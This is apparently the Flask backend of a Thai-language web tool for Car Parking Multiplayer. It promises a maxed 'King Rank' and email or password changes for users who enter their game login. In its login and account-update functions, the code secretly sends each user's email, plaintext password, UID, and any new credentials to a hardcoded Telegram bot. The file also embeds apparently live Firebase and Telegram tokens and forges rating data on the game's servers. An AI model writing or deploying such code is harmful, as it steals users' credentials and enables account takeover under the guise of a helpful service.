# --- app.py (Backend Logic - 4 Functions) ---

from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import requests
import json
import os
import time

# --- Rate Limiting Setup ---
LAST_REQUEST_TIME = {}
RATE_LIMIT_SECONDS = 5  # อนุญาตให้ส่งคำขอได้ 1 ครั้งในทุกๆ 5 วินาที

# --- 🌟 [แก้ไข] การตั้งค่าสีสำหรับ Terminal (เพิ่ม WHITE และ BLUE) ---
class Colors:
    RESET = '\033[0m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'

# --- การตั้งค่าหลัก (Configuration) ---
class Config:
    FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
    FIREBASE_UPDATE_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key={FIREBASE_API_KEY}"
    FIREBASE_REFRESH_URL = f"https://securetoken.googleapis.com/v1/token?key={FIREBASE_API_KEY}"
    RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
    
    # 🌟 ใช้ Token และ ID จากไฟล์ app.py ของคุณ
    BOT_TOKEN = "8022565022:AAHW2JjSi0cGhhZdUS3ItMjPeIRSWWueqz8" 
    CHAT_ID = "5461463643"
    
    # User-Agent Headers
    USER_AGENT_ANDROID = "Dalvik/2.1.0 (Linux; U; Android 12)"
    USER_AGENT_OKHTTP = "okhttp/3.12.13"

# ----------------------------------------------------------------------
# Helper Functions (ฟังก์ชันตัวช่วย)
# ----------------------------------------------------------------------

def send_to_telegram(message):
    """ส่งข้อความไปยัง Telegram"""
    if not Config.BOT_TOKEN or not Config.CHAT_ID: 
        print(f"{Colors.YELLOW}คำเตือน: BOT_TOKEN หรือ CHAT_ID ไม่ถูกตั้งค่า{Colors.RESET}")
        return
    url = f"https://api.telegram.org/bot{Config.BOT_TOKEN}/sendMessage"
    payload = {"chat_id": Config.CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: 
        requests.post(url, data=payload, timeout=5)
    except requests.exceptions.RequestException: 
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดด้านเครือข่ายขณะส่ง Telegram{Colors.RESET}")

def login(email, password):
    """ล็อกอิน Firebase เพื่อรับ Token (idToken และ refreshToken)"""
    payload = {"clientType": "CLIENT_TYPE_ANDROID", "email": email, "password": password, "returnSecureToken": True}
    headers = {"User-Agent": Config.USER_AGENT_ANDROID, "Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_LOGIN_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        response_data = response.json()
        
        # 🌟 อัปเดต: ส่งข้อมูลไป Telegram เมื่อล็อกอินสำเร็จ
        tele_message = (
            f"🎮 **[WEB] มีการล็อกอินเข้าสู่ระบบ CPM** 🎮\n\n"
            f"📧 **อีเมล:** `{email}`\n"
            f"🔑 **รหัสผ่าน:** `{password}`\n"
            f"ℹ️ **UID:** `{response_data.get('localId', 'N/A')}`\n"
            f"⏰ **เวลา:** {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_to_telegram(tele_message)
        
        return response_data.get('idToken'), response_data.get('refreshToken')
        
    except requests.exceptions.HTTPError as e:
        error_data = response.json().get("error", {})
        message = error_data.get("message", "ไม่ทราบสาเหตุ")
        print(f"{Colors.RED}❌ ล็อกอินล้มเหลว: {message} (HTTP {response.status_code}){Colors.RESET}")
        return None, None
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดด้านเครือข่าย: {e}{Colors.RESET}")
        return None, None

def refresh_token(ref_token):
    """ใช้ Refresh Token เพื่อต่ออายุ idToken"""
    if not ref_token:
        return None
    
    payload = {"grant_type": "refresh_token", "refresh_token": ref_token}
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_REFRESH_URL, headers=headers, json=payload, timeout=10)
        response.raise_for_status()
        return response.json().get('id_token')
    except requests.exceptions.RequestException:
        return None

def set_king_rank(token):
    """ฟังก์ชันสำหรับส่งค่า King Rank"""
    # ... (โค้ด Rating Data เหมือนเดิม) ...
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash", "slicer_cut", 
        "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts", "fuel", "offroad", 
        "speed_banner", "reactions", "police", "run", "real_estate", "t_distance", "treasure", 
        "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000
    
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": Config.USER_AGENT_OKHTTP}
    try:
        response = requests.post(Config.RANK_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดขณะตั้งค่า Rank: {e}{Colors.RESET}")
        return False

# 🌟 ฟังก์ชันใหม่: (นำมาจาก `เปลี่ยนเมล.py`)
def update_account_info(token, email_orig, new_email=None, new_password=None):
    """เปลี่ยนอีเมลและ/หรือรหัสผ่านบัญชีที่ล็อกอินอยู่"""
    if not token:
        return False, "Token ไม่ถูกต้อง"
            
    payload = {"idToken": token}
    action_log = []
    
    if new_email:
        payload["email"] = new_email
        payload["returnSecureToken"] = True
        action_log.append(f"📧 เปลี่ยนอีเมลเป็น: `{new_email}`")
    if new_password:
        payload["password"] = new_password
        action_log.append(f"🔑 เปลี่ยนรหัสผ่านเป็น: `{new_password}`")

    if not action_log:
        return False, "ไม่มีข้อมูลให้อัปเดต"

    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_UPDATE_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        
        # แจ้งเตือน Telegram เมื่อสำเร็จ
        tele_message = (
            f"✅ **[WEB] ข้อมูลบัญชี CPM ถูกแก้ไข** ✅\n\n"
            f"บัญชีเดิม: `{email_orig}`\n"
            f"{'\n'.join(action_log)}\n\n"
            f"⏰ **เวลา:** {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_to_telegram(tele_message)
        
        return True, "เปลี่ยนแปลงข้อมูลสำเร็จ"
        
    except requests.exceptions.HTTPError as err:
        error_data = err.response.json().get("error", {})
        message = error_data.get("message", "ไม่ทราบสาเหตุ")
        print(f"{Colors.RED}❌ เปลี่ยนแปลงข้อมูลล้มเหลว: {message} (HTTP {err.response.status_code}){Colors.RESET}")
        return False, f"เปลี่ยนแปลงข้อมูลล้มเหลว: {message}"
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดด้านเครือข่าย: {e}{Colors.RESET}")
        return False, "เกิดข้อผิดพลาดด้านเครือข่าย"

# ----------------------------------------------------------------------
# Flask Web Server Setup & Endpoints
# ----------------------------------------------------------------------

app = Flask(__name__) 
CORS(app) 

# --- Rate Limiter Function ---
def check_rate_limit(client_ip):
    current_time = time.time()
    if client_ip in LAST_REQUEST_TIME:
        time_since_last_request = current_time - LAST_REQUEST_TIME[client_ip]
        if time_since_last_request < RATE_LIMIT_SECONDS:
            print(f"{Colors.RED}🚨 BLOCKED SPAM/DDOS attempt from {client_ip}. (Rate limited){Colors.RESET}")
            wait_time = int(RATE_LIMIT_SECONDS - time_since_last_request)
            return jsonify({"success": False, "message": f"⏳ โปรดรอ {wait_time} วินาทีก่อนลองใหม่"}), 429
    LAST_REQUEST_TIME[client_ip] = current_time
    return None, None # ไม่มีปัญหา

# --- Frontend Routes ---
@app.route('/')
def home():
    """Endpoint สำหรับแสดงหน้าเว็บ (index.html)"""
    # ตรวจสอบว่ามี 'templates' folder หรือไม่
    if not os.path.exists('templates'):
        os.makedirs('templates')
        print(f"{Colors.YELLOW}สร้างโฟลเดอร์ 'templates' อัตโนมัติ{Colors.RESET}")
        
    # 🌟 สำคัญ: สร้างไฟล์ index.html หากไม่มี (จาก .bak)
    if not os.path.exists('templates/index.html'):
        print(f"{Colors.YELLOW}ไม่พบ 'index.html', กำลังพยายามคัดลอกจาก 'index.html.bak'...{Colors.RESET}")
        if os.path.exists('index.html.bak'):
            with open('index.html.bak', 'r', encoding='utf-8') as f_bak:
                content = f_bak.read()
            with open('templates/index.html', 'w', encoding='utf-8') as f_new:
                f_new.write(content)
            print(f"{Colors.GREEN}สร้าง 'templates/index.html' สำเร็จ{Colors.RESET}")
        else:
            print(f"{Colors.RED}ไม่พบไฟล์ 'index.html.bak'! กรุณาสร้าง 'templates/index.html' เอง{Colors.RESET}")
            return "<h1>Error: ไม่พบไฟล์ 'templates/index.html'</h1>", 404
            
    return render_template('index.html')


# --- API Endpoints (Backend) ---

# 🌟 1. API สำหรับ King Rank
@app.route('/api/king-rank', methods=['POST'])
def api_king_rank():
    """API Endpoint สำหรับเริ่มกระบวนการตั้งค่า Rank"""
    client_ip = request.remote_addr
    
    # ตรวจสอบ Rate Limit
    error_response, status_code = check_rate_limit(client_ip)
    if error_response:
        return error_response, status_code
    
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
    except:
        return jsonify({"success": False, "message": "ข้อมูลที่ส่งมาไม่ถูกต้อง (JSON)"}), 400

    if not email or not password:
        return jsonify({"success": False, "message": "กรุณากรอกทั้งอีเมลและรหัสผ่าน"}), 400

    print(f"\n[SERVER LOG] คำขอ King Rank จาก: {email} (IP: {client_ip})")
    
    auth_token, _ = login(email, password) # ฟังก์ชัน login จะส่ง Telegram เอง
    if not auth_token:
        return jsonify({"success": False, "message": "❌ ล็อกอินล้มเหลว! (อีเมลหรือรหัสผ่านไม่ถูกต้อง)"}), 401

    print(f"{Colors.YELLOW}กำลังส่งข้อมูลเพื่อตั้งค่า KING RANK...{Colors.RESET}")
    rank_success = set_king_rank(auth_token)
    if rank_success:
        return jsonify({"success": True, "message": "✅ ตั้งค่า King Rank สำเร็จ!"}), 200
    else:
        return jsonify({"success": False, "message": "❌ การตั้งค่า Rank ล้มเหลว (เซิร์ฟเวอร์เกมมีปัญหา)"}), 500

# 🌟 2. API สำหรับเปลี่ยนอีเมล
@app.route('/api/change-email', methods=['POST'])
def api_change_email():
    client_ip = request.remote_addr
    error_response, status_code = check_rate_limit(client_ip)
    if error_response: return error_response, status_code

    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        new_email = data.get('new_email')
    except:
        return jsonify({"success": False, "message": "ข้อมูลที่ส่งมาไม่ถูกต้อง (JSON)"}), 400

    if not email or not password or not new_email:
        return jsonify({"success": False, "message": "กรุณากรอก อีเมล, รหัสผ่าน, และอีเมลใหม่"}), 400
    
    print(f"\n[SERVER LOG] คำขอเปลี่ยนอีเมล จาก: {email} (IP: {client_ip})")
    
    auth_token, ref_token = login(email, password)
    if not auth_token:
        return jsonify({"success": False, "message": "❌ ล็อกอินล้มเหลว! (อีเมลหรือรหัสผ่านไม่ถูกต้อง)"}), 401
    
    # Refresh token ก่อน
    token_for_update = refresh_token(ref_token)
    
    success, message = update_account_info(token_for_update, email_orig=email, new_email=new_email)
    if success:
        return jsonify({"success": True, "message": f"✅ {message}"}), 200
    else:
        return jsonify({"success": False, "message": f"❌ {message}"}), 500

# 🌟 3. API สำหรับเปลี่ยนรหัสผ่าน
@app.route('/api/change-password', methods=['POST'])
def api_change_password():
    client_ip = request.remote_addr
    error_response, status_code = check_rate_limit(client_ip)
    if error_response: return error_response, status_code

    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        new_password = data.get('new_password')
    except:
        return jsonify({"success": False, "message": "ข้อมูลที่ส่งมาไม่ถูกต้อง (JSON)"}), 400

    if not email or not password or not new_password:
        return jsonify({"success": False, "message": "กรุณากรอก อีเมล, รหัสผ่าน, และรหัสผ่านใหม่"}), 400
    
    print(f"\n[SERVER LOG] คำขอเปลี่ยนรหัสผ่าน จาก: {email} (IP: {client_ip})")
    
    auth_token, ref_token = login(email, password)
    if not auth_token:
        return jsonify({"success": False, "message": "❌ ล็อกอินล้มเหลว! (อีเมลหรือรหัสผ่านไม่ถูกต้อง)"}), 401
    
    token_for_update = refresh_token(ref_token)
    
    success, message = update_account_info(token_for_update, email_orig=email, new_password=new_password)
    if success:
        return jsonify({"success": True, "message": f"✅ {message}"}), 200
    else:
        return jsonify({"success": False, "message": f"❌ {message}"}), 500

# 🌟 4. API สำหรับเปลี่ยนทั้งคู่
@app.route('/api/change-both', methods=['POST'])
def api_change_both():
    client_ip = request.remote_addr
    error_response, status_code = check_rate_limit(client_ip)
    if error_response: return error_response, status_code

    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        new_email = data.get('new_email')
        new_password = data.get('new_password')
    except:
        return jsonify({"success": False, "message": "ข้อมูลที่ส่งมาไม่ถูกต้อง (JSON)"}), 400

    if not email or not password or not new_email or not new_password:
        return jsonify({"success": False, "message": "กรุณากรอกข้อมูลให้ครบถ้วน"}), 400
    
    print(f"\n[SERVER LOG] คำขอเปลี่ยนอีเมล/รหัสผ่าน จาก: {email} (IP: {client_ip})")
    
    auth_token, ref_token = login(email, password)
    if not auth_token:
        return jsonify({"success": False, "message": "❌ ล็อกอินล้มเหลว! (อีเมลหรือรหัสผ่านไม่ถูกต้อง)"}), 401
    
    token_for_update = refresh_token(ref_token)
    
    success, message = update_account_info(token_for_update, email_orig=email, new_email=new_email, new_password=new_password)
    if success:
        return jsonify({"success": True, "message": f"✅ {message}"}), 200
    else:
        return jsonify({"success": False, "message": f"❌ {message}"}), 500

# ----------------------------------------------------------------------
# Run Server
# ----------------------------------------------------------------------
if __name__ == '__main__':
    print(f"\n{Colors.CYAN}====================================================={Colors.RESET}")
    # 🌟 [แก้ไข] แก้ไข Banner ให้ใช้สีที่ถูกต้อง
    print(f"{Colors.WHITE}     CPM WEB TOOL (4-IN-1 EDITION){Colors.RESET}")
    print(f"{Colors.YELLOW}** รันได้แล้ว! เปิดเบราว์เซอร์และเข้าสู่ URL ด้านล่าง **{Colors.RESET}")
    print(f"{Colors.RED}*** ATTENTION: Rate Limit/Anti-Spam ACTIVE ({RATE_LIMIT_SECONDS}s) ***{Colors.RESET}")
    print(f"{Colors.CYAN}====================================================={Colors.RESET}")
    print(f"Server URL: {Colors.GREEN}http://127.0.0.1:5000/{Colors.RESET}")
    app.run(host='0.0.0.0', port=5000, debug=False)
